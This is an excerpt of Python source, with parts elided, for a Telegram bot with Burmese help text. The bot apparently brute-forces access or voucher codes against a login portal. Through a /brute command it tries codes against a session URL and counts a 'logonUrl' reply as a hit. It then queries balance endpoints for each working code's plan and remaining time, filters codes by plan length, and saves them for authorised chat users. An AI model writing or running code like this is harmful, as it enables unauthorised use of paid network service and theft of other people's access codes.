...
old_success_texts = {}      # {chat_id: [...]} – previous session codes
limited_texts = {}          # {chat_id: [code, ...]}
old_limited_texts = {}      # {chat_id: [code, ...]}
...
def plan_to_minutes(s):
    """Parse plan string like '1d', '2h', '30min', '1mo', 'unlimit' → total minutes."""
    if not s:
        return 0
    s = s.strip().lower()
...
async def get_balance(session_id):
    """Fetch plan name and remaining time. Returns dict {plan, time}."""
    result = {"plan": "N/A", "time": "N/A"}
    balance_urls = [
    ...
    for url in balance_urls:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                raw = await resp.text()
                print(f"[get_balance] url={url} status={resp.status} body={raw[:500]}")
                if resp.status != 200:
                    continue
                try:
                    data = json.loads(raw)
                ...
                for d in candidates:
                    ...
                    # Extract plan name
                    if result["plan"] == "N/A":
                        for pkey in ['planName', 'plan_name', 'planname', 'serviceName',
                                     'service_name', 'productName', 'product_name', 'name',
                                     'plan', 'packageName', 'package_name', 'policyName',
                                     'policy_name', 'authPlan', 'authPlanName']:
                            pval = d.get(pkey)
                            if pval and isinstance(pval, str) and pval.strip():
                                result["plan"] = pval.strip()
                                break
                    ...
                    if result["time"] == "N/A":
                        for key in ['remainingSeconds', 'remainTime', 'remainingTime',
                                    ...
                                    'totalSeconds', 'remainSeconds', 'leftSeconds']:
                            val = d.get(key)
                            if val is not None:
                                result["time"] = _parse_seconds(val)
                                break
                    # Extract time from totalTime/validTime/duration
                    if result["time"] == "N/A":
                        for key in ['totalTime', 'validTime', 'duration']:
                            val = d.get(key)
                            if val is not None:
                                try:
                                    result["time"] = _parse_seconds(int(val))
                                except (ValueError, TypeError):
                                    if isinstance(val, str) and val.strip():
                                        result["time"] = val.strip()
                                break

                if result["plan"] != "N/A" or result["time"] != "N/A":
                    return result
        except Exception as e:
            print(f"[get_balance] error for {url}: {e}")
            continue
    return result
...
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    ...
    if 'logonUrl' in response:
        ...
        time_str = "N/A"
        try:
            balance_info = await get_balance(session_id)
            if isinstance(balance_info, dict):
                plan_name = balance_info.get("plan", "N/A")
                time_str = balance_info.get("time", "N/A")
        except Exception:
            pass

        if plan_filters:
            code_mins = plan_to_minutes(time_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_name, "time": time_str})

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_name, "time": time_str})
...
async def help_cmd(message):
    help_text = (
        ...
        "   /brute 6             → အစုံရှာ\n"
        "/stop - Scan ရပ်ရန်\n"
        "/resume - ရပ်ထားသည့် scan ပြန်စရန်\n"
        "/saved - Success/limited codes ကြည့်ရန်\n"
...
async def handle_key(message):
    ...
    if str(message.chat.id) == ADMIN_ID:
        ...
        save_state()
        await bot.reply_to(message, "✅ Admin access အတည်ပြုပြီးပါပြီ။ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
...
async def saved_codes(message):
    ...
    if success:
        ...
        for item in success:
            c = item["code"]
            p = item.get("plan", "N/A")
            t = item.get("time", item.get("plan", "N/A"))
            parts.append(f"🎫 `{c}`\n   📋 Plan: {p} | ⏳ Time: {t}")
    if limited:
